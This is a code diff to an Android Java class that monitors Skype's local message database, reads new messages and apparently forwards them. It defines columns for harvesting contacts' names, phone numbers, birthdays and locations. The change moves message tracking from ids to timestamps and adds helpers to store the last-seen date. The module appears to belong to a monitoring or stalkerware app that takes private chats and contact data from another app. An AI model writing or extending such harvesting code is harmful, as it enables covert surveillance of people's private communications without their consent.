@@ -69,12 +69,14 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 	private static final String[] MESSAGES_COLUMNS = new String[] {"id", "convo_id", "chatname", "author", "from_dispname", "timestamp", "type", "body_xml", "participant_count", "chatmsg_type", "chatmsg_status", "pk_id", "crc", "remote_id", "server_id", "timestamp__ms", "extprop_EXTENDED_TELEMETRY_MESSAGE_SEND_NETWORK_TYPE"};
 	private static final String[] CONTACTS_COLUMNS = new String[] { "id", "type", "skypename", "fullname", "birthday", "gender", "languages", "country", "province", "city", "phone_home", "phone_office", "phone_mobile", "homepage", "about", "mood_text", "timezone", "profile_timestamp", "lastonline_timestamp", "displayname", "firstname", "lastname", "given_displayname", "assigned_speeddial", "external_id", "external_system_id", "avatar_url" };
 	private static final String SETTINGS_LASTID = "SKYPE_LAST_ID";
+	private static final String SETTINGS_LASTDATE = "SKYPE_LAST_DATE";
 
 	private String LOCAL_PATH_MESSAGES = "";
 
 	private Context mContext;
 	private SettingsManager mSettings;
 	private String mLastMsgId;
+    private Long mLastMsgDate;
 	private FileObserver mObserver;
 	private HashMap<String, String> mUsernames;
 	private boolean mIsStarted;
@@ -183,6 +185,7 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 
 				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
 				mLastMsgId = settings.getString(SETTINGS_LASTID, getLastMsgId());
+                mLastMsgDate = settings.getLong(SETTINGS_LASTDATE, getLastMsgDate());
 				mObserver = new SkypeFileObserver();
 
 				Debug.i("[SkypeModule] Start watching");
@@ -208,6 +211,7 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 
 		try {
 			saveLastMsgId(mLastMsgId);
+            saveLastMsgDate(mLastMsgDate);
 			if (mObserver != null) {
 				mObserver.stopWatching();
 			}
@@ -284,6 +288,7 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 							@Override
 							public void onSuccess() {
 								saveLastMsgId(mLastMsgId);
+                                saveLastMsgDate(mLastMsgDate);
 							}
 						}
 				).start();
@@ -305,8 +310,7 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
 			IMMessage message;
 			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
-			Debug.i("Last ID: " + mLastMsgId);
-			c = db.query("Messages", MESSAGES_COLUMNS, "id > " + mLastMsgId, null, null, null, null);
+			c = db.query("Messages", MESSAGES_COLUMNS, "timestamp > " + mLastMsgDate, null, null, null, null);
 			while (c.moveToNext()) {
 				String mid = c.getString(0);
                 String external_id = c.getString(14);
@@ -335,6 +339,10 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 				final String lastMsgId = mLastMsgId;
 				mLastMsgId = mid;
 				saveLastMsgId(mLastMsgId);
+
+                final long lastMsgDate = mLastMsgDate;
+                mLastMsgDate = date;
+                saveLastMsgDate(mLastMsgDate);
 			}
 
 			return messages;
@@ -425,6 +433,32 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 		}
 	}
 
+
+    private long getLastMsgDate(){
+
+        SQLiteDatabase db = null;
+        Cursor c = null;
+        try {
+            db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
+            c = db.rawQuery("SELECT MAX(timestamp) FROM Messages", null);
+            c.moveToFirst();
+            return c.getLong(0);
+
+        } catch(Exception e){
+            Debug.exception(e);
+            return 0L;
+
+        } finally {
+            if (db != null && db.isOpen()) {
+                db.close();
+            }
+
+            if (c != null) {
+                c.close();
+            }
+        }
+    }
+
 	private int getLastMsgId(SQLiteDatabase db){
 		Cursor c = null;
 		try {
@@ -460,6 +494,14 @@ public class SkypeModule implements OnSharedPreferenceChangeListener {
 
 		mSettings.skypeLastId(lastMsgId);
 	}
+
+    private synchronized void saveLastMsgDate(long lastMsgDate){
+        if (lastMsgDate == 0L) {
+            return;
+        }
+
+        mSettings.skypeLastDate(lastMsgDate);
+    }
 
 	private Boolean networkAvailable(){
 		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
